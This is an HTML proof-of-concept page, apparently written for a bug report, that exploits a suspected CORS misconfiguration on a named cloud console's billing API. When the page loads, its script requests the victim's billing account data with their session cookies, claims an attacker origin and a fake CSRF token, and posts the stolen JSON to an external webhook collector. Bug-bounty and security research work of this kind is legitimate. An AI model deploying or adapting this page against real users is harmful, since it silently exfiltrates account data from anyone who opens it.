<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS Bug Test</title>
</head>
<body>
  <h1>CORS Bug PoC</h1>
  <pre id="output">Waiting for data...</pre>

  <script>
    async function fetchData() {
      const output = document.getElementById("output");

      try {
        // Target URL where you found the CORS issue
        const targetUrl = "https://console.neon.tech/api/v2/organizations/org-round-lab-67110498/billing/account";

        const response = await fetch(targetUrl, {
          method: "GET",
          credentials: "include", // sends cookies/session
          headers: {
            "Origin": "https://evil.com",       // simulate attacker's origin
            "X-Csrf-Token": "randomstring"     // bypass if CSRF isn't validated
          }
        });

        const data = await response.json();
        output.textContent = JSON.stringify(data, null, 2);

        // Send captured data to your webhook
        await fetch("https://webhook.site/YOUR-UNIQUE-ID", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

      } catch (err) {
        output.textContent = "Error: " + err;
      }
    }

    fetchData();
  </script>
</body>
</html>
